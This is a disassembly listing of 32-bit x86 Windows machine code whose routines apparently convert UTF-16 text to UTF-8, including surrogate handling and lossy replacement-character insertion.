  402a2b:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402a2e:	89 f2                	mov    %esi,%edx
  402a30:	6a 03                	push   $0x3
  402a32:	e8 79 eb 02 00       	call   0x4315b0
  402a37:	83 c4 04             	add    $0x4,%esp
  402a3a:	8b 75 d0             	mov    -0x30(%ebp),%esi
  402a3d:	8b 5d c4             	mov    -0x3c(%ebp),%ebx
  402a40:	8b 55 d8             	mov    -0x28(%ebp),%edx
  402a43:	eb a2                	jmp    0x4029e7
  402a45:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  402a4c:	00 00 00 
  402a4f:	90                   	nop
  402a50:	0f b7 c2             	movzwl %dx,%eax
  402a53:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  402a5a:	3d 80 00 00 00       	cmp    $0x80,%eax
  402a5f:	73 2e                	jae    0x402a8f
  402a61:	88 55 e0             	mov    %dl,-0x20(%ebp)
  402a64:	b9 01 00 00 00       	mov    $0x1,%ecx
  402a69:	e9 97 00 00 00       	jmp    0x402b05
  402a6e:	66 90                	xchg   %ax,%ax
  402a70:	0f b7 c0             	movzwl %ax,%eax
  402a73:	81 e2 ff 03 00 00    	and    $0x3ff,%edx
  402a79:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  402a80:	c1 e2 0a             	shl    $0xa,%edx
  402a83:	25 ff 03 00 00       	and    $0x3ff,%eax
  402a88:	8d 84 02 00 00 01 00 	lea    0x10000(%edx,%eax,1),%eax
  402a8f:	89 c1                	mov    %eax,%ecx
  402a91:	89 c2                	mov    %eax,%edx
  402a93:	80 e1 3f             	and    $0x3f,%cl
  402a96:	c1 ea 06             	shr    $0x6,%edx
  402a99:	80 c9 80             	or     $0x80,%cl
  402a9c:	3d 00 08 00 00       	cmp    $0x800,%eax
  402aa1:	73 1d                	jae    0x402ac0
  402aa3:	80 ca c0             	or     $0xc0,%dl
  402aa6:	88 55 e0             	mov    %dl,-0x20(%ebp)
  402aa9:	88 4d e1             	mov    %cl,-0x1f(%ebp)
  402aac:	b9 02 00 00 00       	mov    $0x2,%ecx
  402ab1:	eb 52                	jmp    0x402b05
  402ab3:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  402aba:	00 00 00 
  402abd:	0f 1f 00             	nopl   (%eax)
  402ac0:	80 e2 3f             	and    $0x3f,%dl
  402ac3:	89 df                	mov    %ebx,%edi
  402ac5:	89 c3                	mov    %eax,%ebx
  402ac7:	80 ca 80             	or     $0x80,%dl
  402aca:	c1 eb 0c             	shr    $0xc,%ebx
  402acd:	3d ff ff 00 00       	cmp    $0xffff,%eax
  402ad2:	77 13                	ja     0x402ae7
  402ad4:	80 cb e0             	or     $0xe0,%bl
  402ad7:	88 5d e0             	mov    %bl,-0x20(%ebp)
  402ada:	88 55 e1             	mov    %dl,-0x1f(%ebp)
  402add:	88 4d e2             	mov    %cl,-0x1e(%ebp)
  402ae0:	b9 03 00 00 00       	mov    $0x3,%ecx
  402ae5:	eb 1c                	jmp    0x402b03
  402ae7:	80 e3 3f             	and    $0x3f,%bl
  402aea:	c1 e8 12             	shr    $0x12,%eax
  402aed:	0c f0                	or     $0xf0,%al
  402aef:	80 cb 80             	or     $0x80,%bl
  402af2:	88 45 e0             	mov    %al,-0x20(%ebp)
  402af5:	88 5d e1             	mov    %bl,-0x1f(%ebp)
  402af8:	88 55 e2             	mov    %dl,-0x1e(%ebp)
  402afb:	88 4d e3             	mov    %cl,-0x1d(%ebp)
  402afe:	b9 04 00 00 00       	mov    $0x4,%ecx
  402b03:	89 fb                	mov    %edi,%ebx
  402b05:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402b08:	29 f0                	sub    %esi,%eax
  402b0a:	39 c1                	cmp    %eax,%ecx
  402b0c:	77 1f                	ja     0x402b2d
  402b0e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402b11:	01 f0                	add    %esi,%eax
  402b13:	51                   	push   %ecx
  402b14:	89 cf                	mov    %ecx,%edi
  402b16:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402b19:	51                   	push   %ecx
  402b1a:	50                   	push   %eax
  402b1b:	e8 f0 07 02 00       	call   0x423310
  402b20:	83 c4 0c             	add    $0xc,%esp
  402b23:	01 fe                	add    %edi,%esi
  402b25:	89 75 d0             	mov    %esi,-0x30(%ebp)
  402b28:	e9 33 fe ff ff       	jmp    0x402960
  402b2d:	89 c8                	mov    %ecx,%eax
  402b2f:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
  402b32:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402b39:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402b3c:	89 f2                	mov    %esi,%edx
  402b3e:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402b41:	50                   	push   %eax
  402b42:	e8 69 ea 02 00       	call   0x4315b0
  402b47:	83 c4 04             	add    $0x4,%esp
  402b4a:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402b4d:	8b 75 d0             	mov    -0x30(%ebp),%esi
  402b50:	8b 5d c4             	mov    -0x3c(%ebp),%ebx
  402b53:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402b56:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402b59:	eb b3                	jmp    0x402b0e
  402b5b:	f2 0f 10 45 c8       	movsd  -0x38(%ebp),%xmm0
  402b60:	8b 45 08             	mov    0x8(%ebp),%eax
  402b63:	f2 0f 10 4d d0       	movsd  -0x30(%ebp),%xmm1
  402b68:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  402b6b:	f2 0f 11 48 08       	movsd  %xmm1,0x8(%eax)
  402b70:	f2 0f 11 00          	movsd  %xmm0,(%eax)
  402b74:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402b7b:	83 c4 38             	add    $0x38,%esp
  402b7e:	5e                   	pop    %esi
  402b7f:	5f                   	pop    %edi
  402b80:	5b                   	pop    %ebx
  402b81:	5d                   	pop    %ebp
  402b82:	c3                   	ret
  402b83:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  402b8a:	00 00 00 
  402b8d:	0f 1f 00             	nopl   (%eax)
  402b90:	55                   	push   %ebp
  402b91:	83 ec 0c             	sub    $0xc,%esp
  402b94:	83 c5 0c             	add    $0xc,%ebp
  402b97:	83 7d c8 00          	cmpl   $0x0,-0x38(%ebp)
  402b9b:	74 13                	je     0x402bb0
  402b9d:	8b 75 cc             	mov    -0x34(%ebp),%esi
  402ba0:	ff 15 08 30 43 00    	call   *0x433008
  402ba6:	56                   	push   %esi
  402ba7:	6a 00                	push   $0x0
  402ba9:	50                   	push   %eax
  402baa:	ff 15 0c 30 43 00    	call   *0x43300c
  402bb0:	83 c4 0c             	add    $0xc,%esp
  402bb3:	5d                   	pop    %ebp
  402bb4:	c3                   	ret
  402bb5:	cc                   	int3
  402bb6:	cc                   	int3
  402bb7:	cc                   	int3
  402bb8:	cc                   	int3
  402bb9:	cc                   	int3
  402bba:	cc                   	int3
  402bbb:	cc                   	int3
  402bbc:	cc                   	int3
  402bbd:	cc                   	int3
  402bbe:	cc                   	int3
  402bbf:	cc                   	int3
  402bc0:	55                   	push   %ebp
  402bc1:	89 e5                	mov    %esp,%ebp
  402bc3:	53                   	push   %ebx
  402bc4:	57                   	push   %edi
  402bc5:	56                   	push   %esi
  402bc6:	83 ec 34             	sub    $0x34,%esp
  402bc9:	89 65 e4             	mov    %esp,-0x1c(%ebp)
  402bcc:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  402bd3:	c7 45 ec 50 31 40 00 	movl   $0x403150,-0x14(%ebp)
  402bda:	8b 75 10             	mov    0x10(%ebp),%esi
  402bdd:	8d 45 e8             	lea    -0x18(%ebp),%eax
  402be0:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  402be7:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  402bea:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402bf0:	31 c0                	xor    %eax,%eax
  402bf2:	85 f6                	test   %esi,%esi
  402bf4:	79 07                	jns    0x402bfd
  402bf6:	56                   	push   %esi
  402bf7:	50                   	push   %eax
  402bf8:	e8 81 e8 02 00       	call   0x43147e
  402bfd:	0f 84 dc 01 00 00    	je     0x402ddf
  402c03:	83 ec 0c             	sub    $0xc,%esp
  402c06:	89 74 24 08          	mov    %esi,0x8(%esp)
  402c0a:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402c11:	00 
  402c12:	e8 a9 6f 01 00       	call   0x419bc0
  402c17:	83 c4 0c             	add    $0xc,%esp
  402c1a:	85 c0                	test   %eax,%eax
  402c1c:	0f 84 1c 02 00 00    	je     0x402e3e
  402c22:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402c25:	89 c7                	mov    %eax,%edi
  402c27:	89 75 d0             	mov    %esi,-0x30(%ebp)
  402c2a:	31 d2                	xor    %edx,%edx
  402c2c:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  402c2f:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  402c36:	8d 1c 71             	lea    (%ecx,%esi,2),%ebx
  402c39:	89 ce                	mov    %ecx,%esi
  402c3b:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  402c3e:	eb 14                	jmp    0x402c54
  402c40:	88 04 37             	mov    %al,(%edi,%esi,1)
  402c43:	8b 75 c8             	mov    -0x38(%ebp),%esi
  402c46:	03 55 c4             	add    -0x3c(%ebp),%edx
  402c49:	39 de                	cmp    %ebx,%esi
  402c4b:	89 55 d8             	mov    %edx,-0x28(%ebp)
  402c4e:	0f 84 a0 01 00 00    	je     0x402df4
  402c54:	0f b7 06             	movzwl (%esi),%eax
  402c57:	89 7d e0             	mov    %edi,-0x20(%ebp)
  402c5a:	8d 5e 02             	lea    0x2(%esi),%ebx
  402c5d:	0f b7 f8             	movzwl %ax,%edi
  402c60:	25 00 f8 00 00       	and    $0xf800,%eax
  402c65:	3d 00 d8 00 00       	cmp    $0xd800,%eax
  402c6a:	75 54                	jne    0x402cc0
  402c6c:	81 ff ff db 00 00    	cmp    $0xdbff,%edi
  402c72:	0f 87 90 01 00 00    	ja     0x402e08
  402c78:	3b 5d dc             	cmp    -0x24(%ebp),%ebx
  402c7b:	0f 84 87 01 00 00    	je     0x402e08
  402c81:	0f b7 0b             	movzwl (%ebx),%ecx
  402c84:	8d 81 00 20 00 00    	lea    0x2000(%ecx),%eax
  402c8a:	0f b7 c0             	movzwl %ax,%eax
  402c8d:	3d 00 fc 00 00       	cmp    $0xfc00,%eax
  402c92:	0f 82 70 01 00 00    	jb     0x402e08
  402c98:	89 f8                	mov    %edi,%eax
  402c9a:	8b 7d e0             	mov    -0x20(%ebp),%edi
  402c9d:	81 e1 ff 03 00 00    	and    $0x3ff,%ecx
  402ca3:	83 c6 04             	add    $0x4,%esi
  402ca6:	25 ff 03 00 00       	and    $0x3ff,%eax
  402cab:	c1 e0 0a             	shl    $0xa,%eax
  402cae:	8d 84 08 00 00 01 00 	lea    0x10000(%eax,%ecx,1),%eax
  402cb5:	eb 49                	jmp    0x402d00
  402cb7:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  402cbe:	00 00 
  402cc0:	81 ff 80 00 00 00    	cmp    $0x80,%edi
  402cc6:	89 f8                	mov    %edi,%eax
  402cc8:	73 16                	jae    0x402ce0
  402cca:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  402ccd:	8b 7d e0             	mov    -0x20(%ebp),%edi
  402cd0:	8b 5d dc             	mov    -0x24(%ebp),%ebx
  402cd3:	b1 01                	mov    $0x1,%cl
  402cd5:	be 01 00 00 00       	mov    $0x1,%esi
  402cda:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  402cdd:	eb 3b                	jmp    0x402d1a
  402cdf:	90                   	nop
  402ce0:	8b 7d e0             	mov    -0x20(%ebp),%edi
  402ce3:	3d 00 08 00 00       	cmp    $0x800,%eax
  402ce8:	73 14                	jae    0x402cfe
  402cea:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  402ced:	8b 5d dc             	mov    -0x24(%ebp),%ebx
  402cf0:	be 02 00 00 00       	mov    $0x2,%esi
  402cf5:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  402cfc:	eb 1c                	jmp    0x402d1a
  402cfe:	89 de                	mov    %ebx,%esi
  402d00:	8b 5d dc             	mov    -0x24(%ebp),%ebx
  402d03:	89 75 c8             	mov    %esi,-0x38(%ebp)
  402d06:	3d 00 00 01 00       	cmp    $0x10000,%eax
  402d0b:	be 04 00 00 00       	mov    $0x4,%esi
  402d10:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  402d17:	83 de 00             	sbb    $0x0,%esi
  402d1a:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  402d1d:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  402d20:	29 d1                	sub    %edx,%ecx
  402d22:	39 ce                	cmp    %ecx,%esi
  402d24:	89 d6                	mov    %edx,%esi
  402d26:	77 7e                	ja     0x402da6
  402d28:	80 7d cc 00          	cmpb   $0x0,-0x34(%ebp)
  402d2c:	0f 85 0e ff ff ff    	jne    0x402c40
  402d32:	89 c1                	mov    %eax,%ecx
  402d34:	89 55 e0             	mov    %edx,-0x20(%ebp)
  402d37:	89 c3                	mov    %eax,%ebx
  402d39:	89 ca                	mov    %ecx,%edx
  402d3b:	c1 eb 06             	shr    $0x6,%ebx
  402d3e:	80 e2 3f             	and    $0x3f,%dl
  402d41:	80 ca 80             	or     $0x80,%dl
  402d44:	3d 00 08 00 00       	cmp    $0x800,%eax
  402d49:	73 15                	jae    0x402d60
  402d4b:	80 cb c0             	or     $0xc0,%bl
  402d4e:	88 1c 37             	mov    %bl,(%edi,%esi,1)
  402d51:	88 54 37 01          	mov    %dl,0x1(%edi,%esi,1)
  402d55:	eb 44                	jmp    0x402d9b
  402d57:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  402d5e:	00 00 
  402d60:	80 e3 3f             	and    $0x3f,%bl
  402d63:	89 c8                	mov    %ecx,%eax
  402d65:	80 cb 80             	or     $0x80,%bl
  402d68:	c1 e8 0c             	shr    $0xc,%eax
  402d6b:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
  402d71:	77 0f                	ja     0x402d82
  402d73:	0c e0                	or     $0xe0,%al
  402d75:	88 04 37             	mov    %al,(%edi,%esi,1)
  402d78:	88 5c 37 01          	mov    %bl,0x1(%edi,%esi,1)
  402d7c:	88 54 37 02          	mov    %dl,0x2(%edi,%esi,1)
  402d80:	eb 19                	jmp    0x402d9b
  402d82:	c1 e9 12             	shr    $0x12,%ecx
  402d85:	24 3f                	and    $0x3f,%al
  402d87:	80 c9 f0             	or     $0xf0,%cl
  402d8a:	0c 80                	or     $0x80,%al
  402d8c:	88 0c 37             	mov    %cl,(%edi,%esi,1)
  402d8f:	88 44 37 01          	mov    %al,0x1(%edi,%esi,1)
  402d93:	88 5c 37 02          	mov    %bl,0x2(%edi,%esi,1)
  402d97:	88 54 37 03          	mov    %dl,0x3(%edi,%esi,1)
  402d9b:	8b 5d dc             	mov    -0x24(%ebp),%ebx
  402d9e:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402da1:	e9 9d fe ff ff       	jmp    0x402c43
  402da6:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402da9:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402db0:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  402db3:	89 55 e0             	mov    %edx,-0x20(%ebp)
  402db6:	ff 75 c4             	push   -0x3c(%ebp)
  402db9:	e8 f2 e7 02 00       	call   0x4315b0
  402dbe:	83 c4 04             	add    $0x4,%esp
  402dc1:	8b 7d d4             	mov    -0x2c(%ebp),%edi
  402dc4:	8b 75 d8             	mov    -0x28(%ebp),%esi
  402dc7:	8b 5d dc             	mov    -0x24(%ebp),%ebx
  402dca:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402dcd:	8b 45 c0             	mov    -0x40(%ebp),%eax
  402dd0:	80 7d cc 00          	cmpb   $0x0,-0x34(%ebp)
  402dd4:	0f 85 66 fe ff ff    	jne    0x402c40
  402dda:	e9 53 ff ff ff       	jmp    0x402d32
  402ddf:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  402de6:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  402ded:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  402df4:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402df7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402dfa:	f2 0f 10 45 d0       	movsd  -0x30(%ebp),%xmm0
  402dff:	89 41 08             	mov    %eax,0x8(%ecx)
  402e02:	f2 0f 11 01          	movsd  %xmm0,(%ecx)
  402e06:	eb 22                	jmp    0x402e2a
  402e08:	8b 45 08             	mov    0x8(%ebp),%eax
  402e0b:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  402e0f:	c7 00 00 00 00 80    	movl   $0x80000000,(%eax)
  402e15:	74 13                	je     0x402e2a
  402e17:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  402e1a:	ff 15 08 30 43 00    	call   *0x433008
  402e20:	56                   	push   %esi
  402e21:	6a 00                	push   $0x0
  402e23:	50                   	push   %eax
  402e24:	ff 15 0c 30 43 00    	call   *0x43300c
  402e2a:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402e2d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402e33:	8b 45 08             	mov    0x8(%ebp),%eax
  402e36:	83 c4 34             	add    $0x34,%esp
  402e39:	5e                   	pop    %esi
  402e3a:	5f                   	pop    %edi
  402e3b:	5b                   	pop    %ebx
  402e3c:	5d                   	pop    %ebp
  402e3d:	c3                   	ret
  402e3e:	b8 01 00 00 00       	mov    $0x1,%eax
  402e43:	e9 ae fd ff ff       	jmp    0x402bf6
  402e48:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  402e4f:	00 
  402e50:	55                   	push   %ebp
  402e51:	83 ec 0c             	sub    $0xc,%esp
  402e54:	83 c5 0c             	add    $0xc,%ebp
  402e57:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  402e5b:	74 13                	je     0x402e70
  402e5d:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  402e60:	ff 15 08 30 43 00    	call   *0x433008
  402e66:	56                   	push   %esi
  402e67:	6a 00                	push   $0x0
  402e69:	50                   	push   %eax
  402e6a:	ff 15 0c 30 43 00    	call   *0x43300c
  402e70:	83 c4 0c             	add    $0xc,%esp
  402e73:	5d                   	pop    %ebp
  402e74:	c3                   	ret
  402e75:	cc                   	int3
  402e76:	cc                   	int3
  402e77:	cc                   	int3
  402e78:	cc                   	int3
  402e79:	cc                   	int3
  402e7a:	cc                   	int3
  402e7b:	cc                   	int3
  402e7c:	cc                   	int3
  402e7d:	cc                   	int3
  402e7e:	cc                   	int3
  402e7f:	cc                   	int3
  402e80:	55                   	push   %ebp
  402e81:	89 e5                	mov    %esp,%ebp
  402e83:	53                   	push   %ebx
  402e84:	57                   	push   %edi
  402e85:	56                   	push   %esi
  402e86:	83 ec 48             	sub    $0x48,%esp
  402e89:	89 65 e4             	mov    %esp,-0x1c(%ebp)
  402e8c:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  402e93:	c7 45 ec 60 31 40 00 	movl   $0x403160,-0x14(%ebp)
  402e9a:	8b 45 0c             	mov    0xc(%ebp),%eax
  402e9d:	8b 75 08             	mov    0x8(%ebp),%esi
  402ea0:	8b 7d 10             	mov    0x10(%ebp),%edi
  402ea3:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402ea6:	64 8b 15 00 00 00 00 	mov    %fs:0x0,%edx
  402ead:	89 55 e8             	mov    %edx,-0x18(%ebp)
  402eb0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402eb7:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402eba:	8d 45 c8             	lea    -0x38(%ebp),%eax
  402ebd:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  402ec0:	89 7d cc             	mov    %edi,-0x34(%ebp)
  402ec3:	50                   	push   %eax
  402ec4:	51                   	push   %ecx
  402ec5:	e8 96 37 00 00       	call   0x406660
  402eca:	83 c4 08             	add    $0x8,%esp
  402ecd:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  402ed0:	85 c9                	test   %ecx,%ecx
  402ed2:	74 16                	je     0x402eea
  402ed4:	8b 5d b8             	mov    -0x48(%ebp),%ebx
  402ed7:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  402edb:	74 26                	je     0x402f03
  402edd:	31 c0                	xor    %eax,%eax
  402edf:	85 ff                	test   %edi,%edi
  402ee1:	79 31                	jns    0x402f14
  402ee3:	57                   	push   %edi
  402ee4:	50                   	push   %eax
  402ee5:	e8 94 e5 02 00       	call   0x43147e
  402eea:	c7 46 04 01 00 00 00 	movl   $0x1,0x4(%esi)
  402ef1:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  402ef8:	c7 06 00 00 00 80    	movl   $0x80000000,(%esi)
  402efe:	e9 5b 01 00 00       	jmp    0x40305e
  402f03:	89 4e 04             	mov    %ecx,0x4(%esi)
  402f06:	89 5e 08             	mov    %ebx,0x8(%esi)
  402f09:	c7 06 00 00 00 80    	movl   $0x80000000,(%esi)
  402f0f:	e9 4a 01 00 00       	jmp    0x40305e
  402f14:	74 25                	je     0x402f3b
  402f16:	89 ce                	mov    %ecx,%esi
  402f18:	83 ec 0c             	sub    $0xc,%esp
  402f1b:	89 7c 24 08          	mov    %edi,0x8(%esp)
  402f1f:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402f26:	00 
  402f27:	e8 94 6c 01 00       	call   0x419bc0
  402f2c:	83 c4 0c             	add    $0xc,%esp
  402f2f:	85 c0                	test   %eax,%eax
  402f31:	0f 84 84 01 00 00    	je     0x4030bb
  402f37:	89 f1                	mov    %esi,%ecx
  402f39:	eb 05                	jmp    0x402f40
  402f3b:	b8 01 00 00 00       	mov    $0x1,%eax
  402f40:	39 fb                	cmp    %edi,%ebx
  402f42:	89 7d d8             	mov    %edi,-0x28(%ebp)
  402f45:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402f48:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  402f4f:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  402f52:	0f 87 19 01 00 00    	ja     0x403071
  402f58:	31 db                	xor    %ebx,%ebx
  402f5a:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  402f5d:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402f60:	01 d8                	add    %ebx,%eax
  402f62:	56                   	push   %esi
  402f63:	51                   	push   %ecx
  402f64:	50                   	push   %eax
  402f65:	e8 a6 03 02 00       	call   0x423310
  402f6a:	83 c4 0c             	add    $0xc,%esp
  402f6d:	01 f3                	add    %esi,%ebx
  402f6f:	29 df                	sub    %ebx,%edi
  402f71:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  402f74:	83 ff 02             	cmp    $0x2,%edi
  402f77:	0f 86 1d 01 00 00    	jbe    0x40309a
  402f7d:	8b 45 d0             	mov    -0x30(%ebp),%eax
  402f80:	c6 44 18 02 bd       	movb   $0xbd,0x2(%eax,%ebx,1)
  402f85:	66 c7 04 18 ef bf    	movw   $0xbfef,(%eax,%ebx,1)
  402f8b:	83 c3 03             	add    $0x3,%ebx
  402f8e:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402f95:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402f98:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  402f9b:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  402f9e:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  402fa1:	89 45 ac             	mov    %eax,-0x54(%ebp)
  402fa4:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  402fa7:	eb 1b                	jmp    0x402fc4
  402fa9:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  402fb0:	c6 44 3e 02 bd       	movb   $0xbd,0x2(%esi,%edi,1)
  402fb5:	66 c7 04 3e ef bf    	movw   $0xbfef,(%esi,%edi,1)
  402fbb:	83 c7 03             	add    $0x3,%edi
  402fbe:	89 7d e0             	mov    %edi,-0x20(%ebp)
  402fc1:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  402fc4:	8d 45 ac             	lea    -0x54(%ebp),%eax
  402fc7:	50                   	push   %eax
  402fc8:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  402fcb:	50                   	push   %eax
  402fcc:	e8 8f 36 00 00       	call   0x406660
  402fd1:	83 c4 08             	add    $0x8,%esp
  402fd4:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  402fd7:	8b 7d d4             	mov    -0x2c(%ebp),%edi
  402fda:	85 c9                	test   %ecx,%ecx
  402fdc:	74 6e                	je     0x40304c
  402fde:	8b 55 d8             	mov    -0x28(%ebp),%edx
  402fe1:	8b 5d b8             	mov    -0x48(%ebp),%ebx
  402fe4:	8b 45 c0             	mov    -0x40(%ebp),%eax
  402fe7:	29 fa                	sub    %edi,%edx
  402fe9:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402fec:	39 d3                	cmp    %edx,%ebx
  402fee:	77 3d                	ja     0x40302d
  402ff0:	8b 75 dc             	mov    -0x24(%ebp),%esi
  402ff3:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  402ff6:	53                   	push   %ebx
  402ff7:	51                   	push   %ecx
  402ff8:	50                   	push   %eax
  402ff9:	e8 12 03 02 00       	call   0x423310
  402ffe:	83 c4 0c             	add    $0xc,%esp
  403001:	01 df                	add    %ebx,%edi
  403003:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  403007:	89 7d e0             	mov    %edi,-0x20(%ebp)
  40300a:	74 b5                	je     0x402fc1
  40300c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40300f:	29 f8                	sub    %edi,%eax
  403011:	83 f8 02             	cmp    $0x2,%eax
  403014:	77 9a                	ja     0x402fb0
  403016:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403019:	89 fa                	mov    %edi,%edx
  40301b:	6a 03                	push   $0x3
  40301d:	e8 8e e5 02 00       	call   0x4315b0
  403022:	83 c4 04             	add    $0x4,%esp
  403025:	8b 75 dc             	mov    -0x24(%ebp),%esi
  403028:	8b 7d e0             	mov    -0x20(%ebp),%edi
  40302b:	eb 83                	jmp    0x402fb0
  40302d:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  403030:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403033:	89 fa                	mov    %edi,%edx
  403035:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  403038:	53                   	push   %ebx
  403039:	e8 72 e5 02 00       	call   0x4315b0
  40303e:	83 c4 04             	add    $0x4,%esp
  403041:	8b 7d e0             	mov    -0x20(%ebp),%edi
  403044:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  403047:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  40304a:	eb a4                	jmp    0x402ff0
  40304c:	8b 75 08             	mov    0x8(%ebp),%esi
  40304f:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403052:	f2 0f 10 45 d8       	movsd  -0x28(%ebp),%xmm0
  403057:	89 46 08             	mov    %eax,0x8(%esi)
  40305a:	f2 0f 11 06          	movsd  %xmm0,(%esi)
  40305e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403061:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403067:	89 f0                	mov    %esi,%eax
  403069:	83 c4 48             	add    $0x48,%esp
  40306c:	5e                   	pop    %esi
  40306d:	5f                   	pop    %edi
  40306e:	5b                   	pop    %ebx
  40306f:	5d                   	pop    %ebp
  403070:	c3                   	ret
  403071:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  403074:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  40307b:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40307e:	31 d2                	xor    %edx,%edx
  403080:	53                   	push   %ebx
  403081:	e8 2a e5 02 00       	call   0x4315b0
  403086:	83 c4 04             	add    $0x4,%esp
  403089:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  40308c:	8b 7d d8             	mov    -0x28(%ebp),%edi
  40308f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403092:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  403095:	e9 c0 fe ff ff       	jmp    0x402f5a
  40309a:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4030a1:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4030a4:	89 da                	mov    %ebx,%edx
  4030a6:	6a 03                	push   $0x3
  4030a8:	e8 03 e5 02 00       	call   0x4315b0
  4030ad:	83 c4 04             	add    $0x4,%esp
  4030b0:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4030b3:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  4030b6:	e9 c5 fe ff ff       	jmp    0x402f80
  4030bb:	b8 01 00 00 00       	mov    $0x1,%eax
  4030c0:	e9 1e fe ff ff       	jmp    0x402ee3
  4030c5:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4030cc:	00 00 00 
  4030cf:	90                   	nop
